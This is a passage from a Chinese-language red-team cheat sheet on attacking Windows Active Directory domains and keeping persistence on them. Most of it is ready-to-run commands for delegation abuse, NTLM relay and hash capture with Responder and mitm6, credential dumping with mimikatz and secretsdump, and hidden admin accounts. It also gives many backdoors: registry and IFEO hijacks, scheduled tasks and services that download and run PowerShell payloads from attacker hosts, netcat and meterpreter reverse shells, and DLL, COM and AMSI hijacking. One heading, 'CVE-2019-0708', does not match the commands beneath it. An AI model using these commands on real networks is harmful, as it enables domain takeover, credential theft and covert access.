>$SD=New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2346829310-1781191092-2540298887-1122)"; $SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
设置完成后查看
```

![image](http://159.75.51.84:8000/img/411.png)

```
配置ACL允许访问
>$RawBytes=Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity' |select -expand msds-allowedtoactonbehalfofotheridentity;$Descriptor= New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes,0;$Descriptor.DiscretionaryAcl
```

![image](http://159.75.51.84:8000/img/412.png)

```
此时使用创建的机器账户的hash可伪造域管
先获取newcom的NTLM
>Rubeus.exe hash /password:123qwe!@# /user:newcom /domain:zone.com
```

![image](http://159.75.51.84:8000/img/413.png)

```
导入票据伪造域管用户访问cifs服务
>Rubeus.exe s4u /user:newcom$ /rc4:00AFFD88FA323B00D4560B F9FEF0EC2F /impersonateuser:godadmin /msdsspn:cifs/dc.zone.com /ptt
```

![image](http://159.75.51.84:8000/img/414.png)

```
成功获取到godadmin的tgs
```

![image](http://159.75.51.84:8000/img/415.png) ![image](http://159.75.51.84:8000/img/416.png) ![image](http://159.75.51.84:8000/img/417.png)

### CVE-2019-0708  cve-2019-0708)

```
>python ntlmrelayx.py -t ldaps://dc.zone.com --remove-mic --delegate-access -smb2support
>python printerbug.py zone.com/y@win7.zone.com 192.168.0.attack
>python getST.py -spn host/win7.zone.com 'zone.com/机器账户$:密码' -impersionate administrator -dc-ip 192.168.0.1
>export KRB5CCNAME=XX.ccahe
>python secretdump.py -k -no-pass dc.zone.com -just-dc
```

### NTLM中继  ntlm)

#### Ntlmrelayx+资源受限委派  ntlmrelayx)

```
域控需启用ldaps，域机器启用ipv6
*当执行ntlmrelayx脚本时，遇到报错
```

![image](http://159.75.51.84:8000/img/418.png)

```
修改
impacket/impacket/examples/ntlmrelayx/attacks/ldapattack.py ldapattack.py脚本，在510行上方加入
if self.config.interactive:
```

![image](http://159.75.51.84:8000/img/419.png)

```
再重新安装>python setup.py install
使用mitm6通过ipv6接管dns服务器，配置好后开始请求网络的WPAD
>mitm6 -i eth1 -d zone.com
```

![image](http://159.75.51.84:8000/img/420.png)

```
使用ntlmreplyx.py监听
>python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --add-computer
当目标重启网络、访问浏览器、重启电脑时会把攻击机视为代理服务器，当目标通过攻击机代理服务器访问网络时，攻击机将会向目标发送代理的认证请求，并中继NTLM认证到LDAP服务器上，完成攻击。
这里要使用ldaps，因为域控会拒绝在不安全的连接中创建账户。
```

![image](http://159.75.51.84:8000/img/421.png)

```
可以看到已经成功添加了一个机器账户RFAYOVCC密码6YdX.NXqQGyuR7[
使用此机器账户申请票据
>python getST.py -spn cifs/sub2k8.zone.com zone.com/RFAYOVCC\$ -impersonate y
```

![image](http://159.75.51.84:8000/img/422.png)

```
>export KRB5CCNAME=y.ccache
获取shell
>python smbexec.py -no-pass -k sub2k8.zone.com
```

![image](http://159.75.51.84:8000/img/423.png)

```
dumphash、缓存hash
>python secretsdump.py -k -no-pass sub2k8.zone.com
```

![image](http://159.75.51.84:8000/img/424.png)

```
当域控机器未启用LDAPS，并且已获得域普通用户权限时
使用powermad创建一个机器账户newcom
https://github.com/Kevin-Robertson/Powermad
>New-MachineAccount -MachineAccount newcom -Password $(ConvertTo-SecureString '123qwe!@#' -AsPlainText -Force)
```

![image](http://159.75.51.84:8000/img/425.png)

```
或
```

![image](http://159.75.51.84:8000/img/426.png) ![image](http://159.75.51.84:8000/img/427.png)

```
>python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --escalate-user newcom\$
```

![image](http://159.75.51.84:8000/img/428.png)

```
后续正常操作即可。
内网存在java webdav时PROPPATCH、PROPFIND、 LOCK等请求方法接受XML作为输入时会形成xxe。攻击者要求采用NTLM认证方式是，webdav会自动使用当前用户的凭据认证。
使用ntlmrelayx监听
>python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --escalate-user newcom\$
Burp发送xxe请求
PROPFIND /webdav HTTP/1.1
Host: 1.1.1.1

<?xml version"1.0" encoding="UFT-8"?>
<!DOCTYPE xxe [
<!ENTITY loot SYSTEM "http://10.1.1.101"> ]>
<D:xxe xmln:D="DAV:"><D:set><D:prop>
<a xmlns="http://xx.e">&loot;</a>
</D:prop></D:set></D:xxe>
```

#### Responder  responder)

##### SMB协议截获  smb_1)

```
内网中间人攻击脚本，kali内置
监听网络接口
>responder -I wlan0(eth0)
指定某台机器或网段：修改/etc/responder/Responder.py中RespondTo参数。
网段中有认证行为会捕获NTLMv2 hash
```

![image](http://159.75.51.84:8000/img/429.png)

```
当访问一个不存在的共享时修改配置文件来解析
Xp
修改/usr/share/responder/servers/SMB.py定位到errorcode修改为\x71\x00\x00\xc0，删除掉/usr/share/responder/Responder.db
```

![image](http://159.75.51.84:8000/img/430.png)

```
XP时使用\\cmd\share形式访问共享输入密码达4次会断开连接。
定位到
```

![image](http://159.75.51.84:8000/img/431.png)

```
修改self.ntry != 10
Win7以上
修改/usr/share/responder/servers/SMB.py定位到##Session Setup 3
```

![image](http://159.75.51.84:8000/img/432.png)

```
删除掉and GrabMessageID(data)[0:1] == "\x02"，删除掉/usr/share/responder/Responder.db
修改后可以进行解析，捕获hash，否则会报错误64
```

![image](http://159.75.51.84:8000/img/433.png)

```
强制截取NTLMv1 hash，修改/usr/share/responder/packets.py，定位到以下参数，修改为\x15\x82\x81\xe2，修改Conf文件设置Challenge为16位固定值。
```

![image](http://159.75.51.84:8000/img/434.png) ![image](http://159.75.51.84:8000/img/435.png) ![image](http://159.75.51.84:8000/img/436.png)

##### WPAD代理欺骗  wpad)

```
>responder -I eth0 -v -F 
F参数即可开启强制WPAD认证服务抓取 hash，访问IE或重启电脑即可发送欺骗认证获得hash。
```

![image](http://159.75.51.84:8000/img/437.png) ![image](http://159.75.51.84:8000/img/438.png)

```
重启也可以抓到
```

![image](http://159.75.51.84:8000/img/439.png)

##### WEB漏洞  web_1)

```
内网中使用文件包含漏洞和XSS
>Responder -I eth0 -v
http://10.1.1.1/file.php?file=\\10.1.1.12\share
http://10.1.1.1/xss.php?article=<img src=\\10.1.1.12\xx>
```

##### 中继攻击  _107)

```
修改/etc/responder/Responder.conf文件，配置smb和http为Off，分别开启两个对话框，使用F参数启用WPAD欺骗浏览器，使用/usr/share/responder/tools中的MultiReplay.py进行中继攻击获得目标cmdshell。
>Responder -I eth0 -v -F
>python MultiReplay.py -t 192.168.0.115 -u ALL
```

![image](http://159.75.51.84:8000/img/440.png) ![image](http://159.75.51.84:8000/img/441.png)

##### NTLMV2HASH破解  ntlmv2hash)

```
使用hashcat破解 -m 5600为NTLMv2类型
>hashcat -m 5600 pass.txt wordlists.txt
```

![image](http://159.75.51.84:8000/img/442.png)

### GPP-Password  gpp-password)

```
域内机器可访问\\zone.com\SYSVOL\zone.com共享文件夹，翻看策略文件，查找groups.xml，ScheduledTasks\ScheduledTasks.xml，Printers\Printers.xml，Drives\Drives.xml，DataSources\DataSources.xml， Services\Services.xml等文件
```

![image](http://159.75.51.84:8000/img/443.png)

```
使用powersploit脚本解密
```

![image](http://159.75.51.84:8000/img/444.png)

```
使用msf的auxiliary/scanner/smb/smb_enum_gpp模块
```

![image](http://159.75.51.84:8000/img/445.png)

### WinRM无文件执行  winrm_1)

```
>winrm quickconfig –q启动winrm
或PS>Enable-PSRemoting -Force
生成木马并启动监听
```

![image](http://159.75.51.84:8000/img/446.png) ![image](http://159.75.51.84:8000/img/447.png)

```
放入已获得权限的机器C盘中
内网另外机器中执行
>net use \\192.168.0.115\c$
>winrm invoke create wmicimv2/win32_process @{commandline="\\192.168.0.115\c\index.exe"}
```

### 添加域管命令  _108)

```
>net user admin$ pass@123 /add /doamin
>net group "Domain admins" admin$ /add /domain
```

### SSH密钥免密登录  ssh_2)

```
>ssh -i id_rsa user@192.168.0.110
```

### 获取保存的RDP密码  rdp_1)

```
位置
C:\Users\用户名\AppData\Local\Microsoft\Credentials
查看命令
>cmdkey /list
>mimikatz log
#dpapi::cred /in:C:\Users\administrator\AppData\Local\Microsoft\Credentials\D53BF8DC4D52D75463D46595907A4015
记录guidMasterKey: {572115f2-80b1-4b1e-be1b-425f5c7a8bfd}
#privilege::debug
#sekurlsa::dpapi
找到GUID为guidMasterKey的值下面的MasterKey: d928f5e02d2e9495f92bb…
#dpapi::cred /in:C:\Users\administrator\AppData\Local\Microsoft\Credentials\D53BF8DC4D52D75463D46595907A4015 /masterkey: d928f5e02d2e9495f92bb…
密码为CredentialBlob值。
```

## 后门&持久化  _109)

### 影子用户  _110)

```
>net user test$ test /add
>net localgroup administrators test$ /add
注册表HKEY_LOCAL_MACHINE\SAM\SAM\
给予administrator SAM的完全控制和读取的权限
以下导出为1.reg
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test$
记录HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test$的默认类型000003EA
以下导出为2.reg
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA
默认administrator默认类型为000001F4
以下导出为3.reg
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4
把000001F4(3.reg)的F值粘贴到000003EA(2.reg)的F值
修改后导入
>regedit /s 1.reg
>regedit /s 2.reg
删除net user test$ /del
Powershell脚本
https://github.com/3gstudent/Windows-User-Clone/blob/master/Windows-User-Clone.ps1
需system权限
>Create-Clone -u 要创建的 -p 密码 -cu 想要克隆的
```

![image](http://159.75.51.84:8000/img/448.png) ![image](http://159.75.51.84:8000/img/449.png)

### RID劫持  rid)

```
利用场景：
激活guest修改rid为管理员的
修改低权限用户rid
劫持rid之前普通用户1的rid值
```

![image](http://159.75.51.84:8000/img/450.png)

```
使用msf的post/windows/manage/rid_hijack模块
```

![image](http://159.75.51.84:8000/img/451.png)

```
运行后可以看到已经变为超管的rid值
```

![image](http://159.75.51.84:8000/img/452.png)

```
此时普通用户1登录系统是为超管权限
```

### Guest激活  guest_1)

```
激活来宾账户，修改其密码，加入administrators组
>net user guest /active:yes
>net user guest 123qwe!@#
>net localgroup administrators guest /ad
```

### 映像劫持  _111)

#### Sethc  sethc)

```
>move sethc.exe 1.exe
>copy cmd.exe sethc.exe
5下shift调用cmd
```

#### 轻松使用  _112)

```
注册表
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
新建Utilman.exe，新建字符串值Debugger,指定为C:\Windows\System32\cmd.exe
> REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

#### IFEO静默执行  ifeo)

```
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe 新建DWORD值GlobalFlag 16进制为200
创建：计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe字符串值：MonitorProcess=muma.exe
DWORD值ReportingMode=1
>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f
>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe" /v ReportingMode /t REG_DWORD /d 1  /f
>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe" /v MonitorProcess /t REG_SZ /d "c:\windows\system32\cmd.exe" /f
```

### 注册表启动项  _113)

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

#### MSF  msf_15)

```
添加一个监听
Meterpreter> reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe'
查询是否添加成功
Meterpreter> reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
Meterpreter> reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
开启防火墙进站规则
> netsh firewall add portopening TCP 444 "name" ENABLE ALL
重启
> shutdown -r -t 0
```

#### CMD  cmd_4)

```
查看注册表启动项
>REG query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
添加启动项
>REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "windowsupdate" /t REG_SZ /F /D "c:\windows\temp\update.exe"
删除启动项
>REG delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "windowsupdate" /f
```

### 计划任务  _114)

#### 加载powershell  powershell_7)

```
>schtasks /Create /tn 名字 /tr 运行程序 /sc hourly /mo 1
>schtasks /create /S TARGET /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.0.107:8080/Invoke-PowerShellTcp.ps1''')'"
```

#### 执行exe  exe_1)

```
创建计划任务
>schtasks /create /RL HIGHEST /F /tn "windowsupdate" /tr "c:\windows\temp\update.exe" /sc DAILY /mo 1 /ST 12:25 /RU SYSTEM
查看计划任务
>schtasks /query | findstr "windowsupdate"
立即执行某项计划任务
>schtasks /run /tn "windowsupdate"
删除某项计划任务
>schtasks /delete /F /tn "windowsupdate"
普通用户权限计划任务
>schtasks /create /F /tn "windowsupdate" /tr "D:\user\zhangsan\file\windowsupdate.exe" /sc DAILY /mo 1 /ST 12:25 
>schtasks /query | findstr "windowsupdate" 
>schtasks /run /tn "windowsupdate" 
>schtasks /delete /F /tn "windowsupdate" 
>schtasks /tn "SysDebug" /query /fo list /v
```

### 进程注入  _115)

#### AppCertDlls  appcertdlls)

```
注册表HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SessionManager\下新建AppCertDlls，新建名字为Default，值为c:\1.dll的项
#msfvenom –p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 –f dll >/root/1.dll
Msf>use exploit/multi/handler
Msf>set payload windows/meterpreter/reverse_tcp
https://cdn.securityxploded.com/download/RemoteDLLInjector.zip
> RemoteDLLInjector64.exe PID c:\1.dll
```

#### AppInit_DLLs  appinit_dlls)

```
注册表HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Window\Appinit_Dlls下AppInit_DLLs设置为c:\1.dll，LoadAppInit_DLLs设置为1
```

#### MSF  msf_16)

```
Msf>use post/windows/manage/reflective_dll_inject
Msf>set session 1
Msf>set pid 1234
Msf>set path c:\\1.dll
Msf>run
&
migrate +pid
&
Meterpreter>run post/windows/manage/migrate
```

### 登录初始化  _116)

```
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon下添加Userinit值
>Powershell.exe Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon" -name Userinit -value "C:\Windows\system32\userinit.exe,c:\muma.exe"
计算机\HKEY_CURRENT_USER\Environment
创建键值UserInitMprLogonScript值为c:\muma.exe
&
Powershell实现：
>Set-ExecutionPolicy RemoteSigned 
保存ps1执行
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon" -name Userinit -value "C:\Windows\system32\userinit.exe,powershell.exe -nop -w hidden -c $w=new-object net.webclient;$w.proxy=[Net.WebRequest]::GetSystemWebProxy();$w.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $w.downloadstring('http://192.168.2.11:8080/kaMhC1');"
# powershell反弹shell的payload参照msf中的web_delivery模块
```

#### 屏幕保护程序  _117)

```
计算机\HKEY_CURRENT_USER\Control Panel\Desktop
SCRNSAVE.EXE - 默认屏幕保护程序，改为恶意程序(设置备份)
ScreenSaveActive - 1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态
ScreenSaverTimeout - 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟）
```

### MOF  mof)

```
>git clone https://github.com/khr0x40sh/metasploit-modules.git
>mv metasploit-modules/persistence/mof_ps_persist.rb /usr/share/metasploit-framework/modules/post/windows/
>reload_all
>use post/windows/mof_ps_persist
>set payload windows/x64/meterpreter/reverse_tcp
>set lhost 192.168.0.108
>set lport 12345
>set session 1
>run
```

![image](http://159.75.51.84:8000/img/453.png)

```
>use exploit/multi/handler
>set payload windows/x64/meterpreter/reverse_tcp
>set lhost 192.168.0.108
>set lport 12345
>set exitonsession false
```

![image](http://159.75.51.84:8000/img/454.png)

```
重启后还会上线
```

![image](http://159.75.51.84:8000/img/455.png)

```
清除后门，进入meterpreter，resource 生成的rc文件
停止MOF
>net stop winmgmt
删除文件夹：C:\WINDOWS\system32\wbem\Repository\
>net start winmgmt
```

### WinRM端口复用  winrm_2)

```
WinRM端口5985，win2012以上默认启动，2008开启命令
>winrm quickconfig -q
2012启用端口复用
>winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}
2008启用WinRM后修改端口为80
>winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}
后门连接和使用
本地开启WinRM并设置信任连接主机
>winrm quickconfig -q
>winrm set winrm/config/Client @{TrustedHosts="*"}
执行命令
>winrs -r:http://10.1.1.100 -u:administrator -p:password ipconfig /all
获取cmdshell
>winrs -r:http://10.1.1.100 -u:administrator -p:password cmd
```

![image](http://159.75.51.84:8000/img/456.png)

```
只administrator允许远程登录WinRM，允许其他用户可以登录，执行注册表
>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

### 创建服务  _118)

```
重启维持nc
>sc create ms binpath= "cmd /K start c:\nc\nc64.exe -d 192.168.0.51 4567 -e cmd.exe" start= delayed-auto error= ignore
重启维持psh
#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=11111 -f psh-reflection >/var/www/html/xxx.ps1
>sc create ms binpath= "cmd /K start C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -nop -exec bypass -c \"IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/xxx.ps1')\"" start= delayed-auto error= ignore
```

![image](http://159.75.51.84:8000/img/457.png)

```
重启维持Cobalt strike
配置监听器，生成web传递模块Powershell脚本
>sc create ms binpath= "cmd /K start C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.0.107:8080/a'))\"" start= delayed-auto error= ignore
```

![image](http://159.75.51.84:8000/img/458.png)

```
Delay执行大概2分钟上线
>sc delete ms 卸载服务
Powershell
>powershell.exe new-service -Name nuoyani -BinaryPathName "C:\WINDOWS\Temp\360.exe" -StartupType Automatic
>$c2='new-';$c3='service -Name nuoyani -DisplayName OrderServ -BinaryPathName "C:\accc.exe" -StartupType Automatic'; $Text=$c2+$c3;IEX(-join $Text)
```

### Bitadmin  bitadmin)

```
创建下载任务
>bitsadmin /create empire
下载的文件设置
>bitsadmin /addfile empire %comspec% c:\windows\temp\1.exe
设置传输时运行的命令,MSFvenom生成dll放入temp目录
>bitsadmin /SetNotifyCmdLine empire cmd.exe "cmd.exe /c rundll32 c:\windows\temp\1.dll,0"
(bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://x.com/shell.sct scrobj.dll")
启动任务
>bitsadmin /resume empire
列出所有用户的下载任务
>bitsadmin /list /allusers /verbose
```

![image](http://159.75.51.84:8000/img/459.png)

```
重启后也会上线
```

![image](http://159.75.51.84:8000/img/460.png)

```
完成任务
>bitsadmin /complete empire
>bitsadmin /cancel <Job> //删除某个任务
>bitsadmin /reset /allusers //删除所有任务
&
>bitsadmin /create mission
>bitsadmin /addfile mission %comspec% %temp%\cmd.exe
>bitsadmin.exe /SetNotifyCmdLine mission regsvr32.exe "/u /s /i:http://192.168.0.107/shell.sct scrobj.dll"
>bitsadmin /Resume mission
```

### CLR Injection  clr-injection)

```
劫持调用.net程序，开机启动
https://github.com/3gstudent/CLR-Injection/blob/master/CLR-Injection_x64.bat
```

![image](http://159.75.51.84:8000/img/461.png) ![image](http://159.75.51.84:8000/img/462.png)

```
WMIC可替换为powershell
New-ItemProperty "HKCU:\Environment\" COR_ENABLE_PROFILING -value "1" -propertyType string | Out-Null
New-ItemProperty "HKCU:\Environment\" COR_PROFILER -value "{11111111-1111-1111-1111-111111111111}" -propertyType string | Out-Null

wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"
wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="{11111111-1111-1111-1111-111111111111}"
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll delete
SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg_x64.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F 
SET KEY=HKEY_CURRENT_USER\Software\Classes\WoW6432Node\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F
添加全局变量
计算机\HKEY_CURRENT_USER\Environment
COR_ENABLE_PROFILING=1
COR_PROFILER={11111111-1111-1111-1111-111111111111}
注册CLSID
计算机\HKEY_CURRENT_USER\Software\Classes\CLSID添加项{11111111-1111-1111-1111-111111111111}和它的子项InprocServer32
新建一个键ThreadingModel，键值为：Apartment，默认键值为dll路径
劫持explorer.exe
>SET COR_ENABLE_PROFILING=1
>SET COR_PROFILER={11111111-1111-1111-1111-111111111111}
位置(新建)
HKEY_CURRENT_USER\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32默认值为恶意DLL
新建ThreadingModel值为Apartment
```

### COM OBJECT hijacking  com-object-hijacking)

#### CAccPropServicesClass and MMDeviceEnumerato  caccpropservicesclass-and-mmdeviceenumerato)

```
无需超管权限，无需重启
https://github.com/3gstudent/COM-Object-hijacking
将恶意DLLbase64编码写入ps脚本
```

![image](http://159.75.51.84:8000/img/463.png) ![image](http://159.75.51.84:8000/img/464.png)

```
执行后会在
%appdata%\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}目录释放2个文件，分别是x86和x64的dll
会在注册表中
HKEY_CURRENT_USER\Software\Classes\CLSID\
新建
{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}和子项默认指向恶意DLL
只要指向.net程序便可上线。如ie，mmc等
```

![image](http://159.75.51.84:8000/img/465.png)

#### Explorer  explorer)

```
注册表位置：HKCU\Software\Classes\CLSID\
创建项{42aedc87-2188-41fd-b9a3-0c966feabec1}
创建子项InprocServer32
Default的键值为恶意dll的绝对路径：C:\test\1.dll
创建键值： ThreadingModel REG_SZ Apartment
```

![image](http://159.75.51.84:8000/img/466.png)

```
HKCU\Software\Classes\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1}
HKCU\Software\Classes\CLSID{fbeb8a05-beee-4442-804e-409d6c4515e9}
HKCU\Software\Classes\CLSID{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}
HKCU\Software\Classes\Wow6432Node\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E}
```

### Squibledoo  squibledoo)

```
创建1.sct
<?XML version="1.0"?>
<scriptlet>
<registration
  description="Component"
  progid="Component.WindowsUpdate"
  version="1.00"
  classid="{20002222-0000-0000-0000-000000000002}"
>
</registration>

<public>
  <method name="exec">
  </method>
</public>
<script language="JScript">
  <![CDATA[
    function exec(){
      new ActiveXObject('WScript.Shell').Run('calc.exe');
    }
  ]]>
</script>
</scriptlet>
创建COM对象
>regsvr32.exe /s /i:http://192.168.0.107/1.sct scrobj.dll
触发
>cscript 1.js
var test = new ActiveXObject("Component.TESTCB");
test.exec()
```

### DLL劫持  dll_1)

#### 劫持1  1_2)

```
注册表
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls下添加 "lpk.dll"(若无，自己创建)
ExcludeFromKnownDlls可使KnownDLLs失效
需要重新启动电脑
查找可劫持的DLL：
1.启动程序
2.使用Process Explorer查看该应用程序启动后加载的DLL。
3.从已经加载的DLL列表中，查找在上述“KnownDLLs注册表项”中不存在的DLL。
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
4.编写第三步中获取到的DLL的劫持DLL。
5.将编写好的劫持DLL放到该应用程序目录下，重新启动该应用程序，检测是否劫持成功。
```

![image](http://159.75.51.84:8000/img/467.png)

```
Explorer.exe启动调用winrar文件夹的RarExt.dll
Msf监听
```

![image](http://159.75.51.84:8000/img/468.png)

```
复制dll文件到the-backdoor-factory文件夹中，加载恶意dll进原dll
>python backdoor.py -f RarExt.dll -s reverse_shell_tcp_inline -P 12138 -H 192.168.0.107 指定为kali监听的IP和端口
```

![image](http://159.75.51.84:8000/img/469.png)

```
生成好的dll在backdoored文件夹，传入靶机中，替换原dll文件，最好把原dll保存备份。
每次打开windows资源管理器的时候，即可上线。重启可维持
```

![image](http://159.75.51.84:8000/img/470.png)

#### 劫持2  2_2)

```
使用
https://github.com/coca1ne/DLL_Hijacker
https://github.com/git20150901/DLLHijack_Detecter
查看要劫持的DLL的函数导出表，会直接生成cpp源码，重编译指向恶意代码
DLLHijack_Detecter可查看程序加载的不在KnownDLLs中的DLL
```

#### MSDTC服务劫持  msdtc)

```
服务名称MSDTC,显示名称Distributed Transaction Coordinator
对应进程msdtc.exe,位于%windir%system32
C:\Windows\System32\wbem\
服务启动搜索注册表位置计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI
#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.51 LPORT=4444 -f dll -o /var/www/html/oci.dll
Oci.dll放入c:\windows\system32\
重启服务即可
>taskkill /f /im msdtc.exe
```

#### Rattler  rattler)

```
自动化查找可劫持的DLL
https://github.com/sensepost/rattler
使用
>Rattler_x64.exe calc.exe 1
会列出可被劫持的DLL
```

![image](http://159.75.51.84:8000/img/471.png)

```
按程序读取DLL位置顺序，把恶意DLL放入程序同目录后，执行程序即可。
```

![image](http://159.75.51.84:8000/img/472.png) ![image](http://159.75.51.84:8000/img/473.png)

### DLL代理劫持右键  dll_2)

```
右键对应的注册表路径是
HKLM\Software\Classes\*\ShellEx\ContextMenuHandlers
使用autoruns查看加载的DLL
```

![image](http://159.75.51.84:8000/img/474.png)

```
以rarext.dll为例
使用https://github.com/rek7/dll-hijacking创建代理DLL
注意修改parse.py中dumpbin.exe的位置
```

![image](http://159.75.51.84:8000/img/475.png)

```
>python3 parse.py -d rarext.dll
```

![image](http://159.75.51.84:8000/img/476.png)

```
修改原DLL为rarext_.dll，重新生成解决方案命名为rarext.dll
将两个DLL放入原目录，重启
```

### 使用AMSI扫描接口维持权限  amsi_1)

```
https://gist.github.com/b4rtik/48ef702603d5e283bc81a05a01fccd40
现amsi已经集成到win10以下组件中
UAC
PowerShell
Windows脚本（wscript.exe和cscript.exe）
JavaScript和VBScript
Office VBA宏
```

![image](http://159.75.51.84:8000/img/721.png)

```
这里使用nc来反弹个shell
```

![image](http://159.75.51.84:8000/img/722.png)

```
使用regsvr32注册dll或手动添加
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\GUID（默认）REG_SZ “提供程序描述”
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\GUID\InprocServer32 (默认)
REG_EXPAND_SZ " DLL的路径" -ThreadingModel REG_SZ "Both"
HKLM \ SOFTWARE \ Microsoft \ AMSI \ Providers \ GUID
Regsvr32使用超管权限
```

![image](http://159.75.51.84:8000/img/723.png)

```
一旦注册，Dll将被加载到任何涉及AMSI和SampleAmsiProvider::Scan方法的进程中，比如在程序中设定，在powershell下发送字符串，触发scan方法，当发送字符串为我们设定的字符串的时候就触发恶意DLL
```

![image](http://159.75.51.84:8000/img/724.png) ![image](http://159.75.51.84:8000/img/725.png)

### DLL劫持计划任务  dll_3)

```
